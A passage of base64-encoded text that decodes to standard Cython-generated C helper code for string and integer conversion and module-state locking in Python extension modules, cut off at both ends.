mU7CiAgICAgICAgY2hhciogY19jb2RlX2J5dGVzID0gUHlCeXRlc19Bc1N0cmluZyhjb2RlX2J5dGVzKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNfY29kZV9ieXRlcykpIGdvdG8gZG9uZTsKICAgICAgICBtZW1zZXQoY19jb2RlX2J5dGVzLCAwLCAoc2l6ZV90KSBjb2RlX2xlbik7CiAgICB9CiAgICBjb2RlX29iaiA9IChQeU9iamVjdCopIF9fUHl4X19QeUNvZGVfTmV3KAogICAgICAgIChpbnQpIGRlc2NyLmFyZ2NvdW50LAogICAgICAgIChpbnQpIGRlc2NyLm51bV9wb3Nvbmx5X2FyZ3MsCiAgICAgICAgKGludCkgZGVzY3IubnVtX2t3b25seV9hcmdzLAogICAgICAgIChpbnQpIGRlc2NyLm5sb2NhbHMsCiAgICAgICAgMCwKICAgICAgICAoaW50KSBkZXNjci5mbGFncywKICAgICAgICBjb2RlX2J5dGVzID8gY29kZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIGZpbGVuYW1lLAogICAgICAgIGZ1bmNuYW1lLAogICAgICAgIChpbnQpIGRlc2NyLmZpcnN0X2xpbmUsCiAgICAgICAgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGVfYnl0ZXMpID8gbGluZV90YWJsZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzCiAgICApOwpkb25lOgogICAgUHlfWERFQ1JFRihjb2RlX2J5dGVzKTsKICAgIFB5X1hERUNSRUYobGluZV90YWJsZV9ieXRlcyk7CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X1hERUNSRUYodmFybmFtZXNfdHVwbGVfZGVkdXApOwogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYodmFybmFtZXNfdHVwbGUpOwogICAgcmV0dXJuIGNvZGVfb2JqOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcykgewogICAgd2hpbGUgKHQtPnMpIHsKICAgICAgICBQeU9iamVjdCAqc3RyOwogICAgICAgIGlmICh0LT5pc191bmljb2RlKSB7CiAgICAgICAgICAgIGlmICh0LT5pbnRlcm4pIHsKICAgICAgICAgICAgICAgIHN0ciA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHQtPnMpOwogICAgICAgICAgICB9IGVsc2UgaWYgKHQtPmVuY29kaW5nKSB7CiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRGVjb2RlKHQtPnMsIHQtPm4gLSAxLCBlbmNvZGluZ19uYW1lc1t0LT5lbmNvZGluZ10sIE5VTEwpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKHQtPnMsIHQtPm4gLSAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ciA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpOwogICAgICAgIH0KICAgICAgICBpZiAoIXN0cikKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICp0YXJnZXQgPSBzdHI7CiAgICAgICAgaWYgKFB5T2JqZWN0X0hhc2goc3RyKSA9PSAtMSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICsrdDsKICAgICAgICArK3RhcmdldDsKICAgIH0KICAgIHJldHVybiAwOwp9CgojaW5jbHVkZSA8c3RyaW5nLmg+CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfc3NpemVfc3RybGVuKGNvbnN0IGNoYXIgKnMpIHsKICAgIHNpemVfdCBsZW4gPSBzdHJsZW4ocyk7CiAgICBpZiAodW5saWtlbHkobGVuID4gKHNpemVfdCkgUFlfU1NJWkVfVF9NQVgpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJieXRlIHN0cmluZyBpcyB0b28gbG9uZyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAoUHlfc3NpemVfdCkgbGVuOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikgewogICAgUHlfc3NpemVfdCBsZW4gPSBfX1B5eF9zc2l6ZV9zdHJsZW4oY19zdHIpOwogICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHsKICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTsKICAgIGlmICh1bmxpa2VseShsZW4gPCAwKSkgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gUHlCeXRlQXJyYXlfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqIG8pIHsKICAgIFB5X3NzaXplX3QgaWdub3JlOwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShvLCAmaWdub3JlKTsKfQojaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOApzdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobykgPT0gLTEpKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsKICAgICAgICBjb25zdCBjaGFyKiByZXN1bHQ7CiAgICAgICAgUHlfc3NpemVfdCB1bmljb2RlX2xlbmd0aDsKICAgICAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih1bmljb2RlX2xlbmd0aCk7IC8vIG9ubHkgZm9yIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICAgICAgaWYgKHVubGlrZWx5KFB5QXJnX1BhcnNlKG8sICJzIyIsICZyZXN1bHQsIGxlbmd0aCkgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2Vsc2UKICAgICAgICByZXN1bHQgPSBQeVVuaWNvZGVfQXNVVEY4QW5kU2l6ZShvLCBsZW5ndGgpOwogICAgICAgICNlbmRpZgogICAgICAgICNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSQogICAgICAgIHVuaWNvZGVfbGVuZ3RoID0gUHlVbmljb2RlX0dldExlbmd0aChvKTsKICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgaWYgKHVubGlrZWx5KHVuaWNvZGVfbGVuZ3RoICE9ICpsZW5ndGgpKSB7CiAgICAgICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2Vsc2UKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvKSkpIHsKICAgICAgICAqbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgobyk7CiAgICAgICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjgobyk7CiAgICB9IGVsc2UgewogICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQojZWxzZQogICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7CiNlbmRpZgojZW5kaWYKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIHx8IF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAgIGlmIChQeVVuaWNvZGVfQ2hlY2sobykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0FzU3RyaW5nQW5kU2l6ZShvLCBsZW5ndGgpOwogICAgfSBlbHNlCiNlbmRpZgogICAgaWYgKFB5Qnl0ZUFycmF5X0NoZWNrKG8pKSB7CiNpZiAoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAoZGVmaW5lZChQeUJ5dGVBcnJheV9BU19TVFJJTkcpICYmIGRlZmluZWQoUHlCeXRlQXJyYXlfR0VUX1NJWkUpKSkKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUobyk7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FTX1NUUklORyhvKTsKI2Vsc2UKICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfU2l6ZShvKTsKICAgICAgICBpZiAoKmxlbmd0aCA9PSAtMSkgcmV0dXJuIE5VTEw7CiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKG8pOwojZW5kaWYKICAgIH0gZWxzZQogICAgewogICAgICAgIGNoYXIqIHJlc3VsdDsKICAgICAgICBpbnQgciA9IFB5Qnl0ZXNfQXNTdHJpbmdBbmRTaXplKG8sICZyZXN1bHQsIGxlbmd0aCk7CiAgICAgICAgaWYgKHVubGlrZWx5KHIgPCAwKSkgewogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0KiB4KSB7CiAgIGludCBpc190cnVlID0geCA9PSBQeV9UcnVlOwogICBpZiAoaXNfdHJ1ZSB8ICh4ID09IFB5X0ZhbHNlKSB8ICh4ID09IFB5X05vbmUpKSByZXR1cm4gaXNfdHJ1ZTsKICAgZWxzZSByZXR1cm4gUHlPYmplY3RfSXNUcnVlKHgpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqIHgpIHsKICAgIGludCByZXR2YWw7CiAgICBpZiAodW5saWtlbHkoIXgpKSByZXR1cm4gLTE7CiAgICByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoeCk7CiAgICBQeV9ERUNSRUYoeCk7CiAgICByZXR1cm4gcmV0dmFsOwp9CnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShQeU9iamVjdCogcmVzdWx0KSB7CiAgICBfX1B5eF9UeXBlTmFtZSByZXN1bHRfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKHJlc3VsdCkpOwogICAgaWYgKFB5TG9uZ19DaGVjayhyZXN1bHQpKSB7CiAgICAgICAgaWYgKFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfRGVwcmVjYXRpb25XYXJuaW5nLCAxLAogICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKS4gICIKICAgICAgICAgICAgICAgICJUaGUgYWJpbGl0eSB0byByZXR1cm4gYW4gaW5zdGFuY2Ugb2YgYSBzdHJpY3Qgc3ViY2xhc3Mgb2YgaW50IGlzIGRlcHJlY2F0ZWQsICIKICAgICAgICAgICAgICAgICJhbmQgbWF5IGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbiBvZiBQeXRob24uIiwKICAgICAgICAgICAgICAgIHJlc3VsdF90eXBlX25hbWUpKSB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTsKICAgICAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgIl9faW50X18gcmV0dXJuZWQgbm9uLWludCAodHlwZSAiIF9fUHl4X0ZNVF9UWVBFTkFNRSAiKSIsCiAgICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7CiAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KSB7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICBQeU51bWJlck1ldGhvZHMgKm07CiNlbmRpZgogIFB5T2JqZWN0ICpyZXMgPSBOVUxMOwogIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrKHgpKSkKICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZih4KTsKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogIG0gPSBQeV9UWVBFKHgpLT50cF9hc19udW1iZXI7CiAgaWYgKGxpa2VseShtICYmIG0tPm5iX2ludCkpIHsKICAgICAgcmVzID0gbS0+bmJfaW50KHgpOwogIH0KI2Vsc2UKICBpZiAoIVB5Qnl0ZXNfQ2hlY2tFeGFjdCh4KSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoeCkpIHsKICAgICAgcmVzID0gUHlOdW1iZXJfTG9uZyh4KTsKICB9CiNlbmRpZgogIGlmIChsaWtlbHkocmVzKSkgewogICAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVja0V4YWN0KHJlcykpKSB7CiAgICAgICAgICByZXR1cm4gX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShyZXMpOwogICAgICB9CiAgfQogIGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAiYW4gaW50ZWdlciBpcyByZXF1aXJlZCIpOwogIH0KICByZXR1cm4gcmVzOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqIGIpIHsKICBQeV9zc2l6ZV90IGl2YWw7CiAgUHlPYmplY3QgKng7CiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChiKSkpIHsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlmIChsaWtlbHkoX19QeXhfUHlMb25nX0lzQ29tcGFjdChiKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShiKTsKICAgIH0gZWxzZSB7CiAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKGIpOwogICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChiKTsKICAgICAgc3dpdGNoIChzaXplKSB7CiAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAyICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAzOgogICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgcmV0dXJuIChQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKCgoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpOwogICAgICAgICAgIH0KICAgICAgICAgICBicmVhazsKICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDQgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgIHJldHVybiAtKFB5X3NzaXplX3QpICgoKCgoKCgoKHNpemVfdClkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMF0pKTsKICAgICAgICAgICB9CiAgICAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgICNlbmRpZgogICAgcmV0dXJuIFB5TG9uZ19Bc1NzaXplX3QoYik7CiAgfQogIHggPSBQeU51bWJlcl9JbmRleChiKTsKICBpZiAoIXgpIHJldHVybiAtMTsKICBpdmFsID0gUHlMb25nX0FzU3NpemVfdCh4KTsKICBQeV9ERUNSRUYoeCk7CiAgcmV0dXJuIGl2YWw7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqIG8pIHsKICBpZiAoc2l6ZW9mKFB5X2hhc2hfdCkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpKSB7CiAgICByZXR1cm4gKFB5X2hhc2hfdCkgX19QeXhfUHlJbmRleF9Bc1NzaXplX3Qobyk7CiAgfSBlbHNlIHsKICAgIFB5X3NzaXplX3QgaXZhbDsKICAgIFB5T2JqZWN0ICp4OwogICAgeCA9IFB5TnVtYmVyX0luZGV4KG8pOwogICAgaWYgKCF4KSByZXR1cm4gLTE7CiAgICBpdmFsID0gUHlMb25nX0FzTG9uZyh4KTsKICAgIFB5X0RFQ1JFRih4KTsKICAgIHJldHVybiBpdmFsOwogIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYikgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYik7CiAgICByZXR1cm4gX19QeXhfTmV3UmVmKFB5X05vbmUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYikgewogIHJldHVybiBiID8gX19QeXhfTmV3UmVmKFB5X1RydWUpIDogX19QeXhfTmV3UmVmKFB5X0ZhbHNlKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCBpdmFsKSB7CiAgICByZXR1cm4gUHlMb25nX0Zyb21TaXplX3QoaXZhbCk7Cn0KI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSkgewogICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSkKICAgICAgICByZXR1cm4gMDsKICAgIFB5X3NzaXplX3QgdmFsdWUgPSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpOwogICAgaWYgKChzaXplb2YobG9uZykgPCBzaXplb2YoUHlfc3NpemVfdCkpICYmIHVubGlrZWx5KHZhbHVlICE9IChsb25nKSB2YWx1ZSkpCiAgICAgICAgcmV0dXJuIDA7CiAgICAqcmV0dXJuX3ZhbHVlID0gKGxvbmcpIHZhbHVlOwogICAgcmV0dXJuIDE7Cn0KI2VuZGlmCgoKCiNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgJiYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKI2lmbmRlZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQojaWYgKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCkKICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDEKI2Vsc2UKICAjZGVmaW5lIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFIDAKI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgJiYgIUNZVEhPTl9BVE9NSUNTCiNlcnJvciAiTW9kdWxlIHN0YXRlIHdpdGggUEVQNDg5IHJlcXVpcmVzIGF0b21pY3MuIEN1cnJlbnRseSB0aGF0J3Mgb25lIG9mXAogQzExLCBDKysxMSwgZ2NjIGF0b21pYyBpbnRyaW5zaWNzIG9yIE1TVkMgYXRvbWljIGludHJpbnNpY3MiCiNlbmRpZgojaWYgIUNZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkKI2VsaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMApzdGF0aWMgUHlNdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCA9IHswfTsKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgUHlNdXRleF9Mb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleCkKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKSBQeU11dGV4X1VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbGlmIGRlZmluZWQoX19jcGx1c3BsdXMpICYmIF9fY3BsdXNwbHVzID49IDIwMTEwM0wKI2luY2x1ZGUgPG11dGV4PgpzdGF0aWMgc3RkOjptdXRleCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDsKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgubG9jaygpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgudW5sb2NrKCkKI2VsaWYgZGVmaW5lZChfX1NURENfVkVSU0lPTl9fKSAmJiAoX19TVERDX1ZFUlNJT05fXyA+IDIwMTExMkwpICYmICFkZWZpbmVkKF9fU1REQ19OT19USFJFQURTX18pCiNpbmNsdWRlIDx0aHJlYWRzLmg+CnN0YXRpYyBtdHhfdCBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleDsKc3RhdGljIG9uY2VfZmxhZyBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcgPSBPTkNFX0ZMQUdfSU5JVDsKc3RhdGljIHZvaWQgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfaW5pdGlhbGl6ZV9tdXRleCh2b2lkKSB7CiAgICBtdHhfaW5pdCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgsIG10eF9wbGFpbik7Cn0KI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKClcCiAgY2FsbF9vbmNlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleF9vbmNlX2ZsYWcsIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2luaXRpYWxpemVfbXV0ZXgpO1wKICBtdHhfbG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgbXR4X3VubG9jaygmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgpCiNlbGlmIGRlZmluZWQoSEFWRV9QVEhSRUFEX0gpCiNpbmNsdWRlIDxwdGhyZWFkL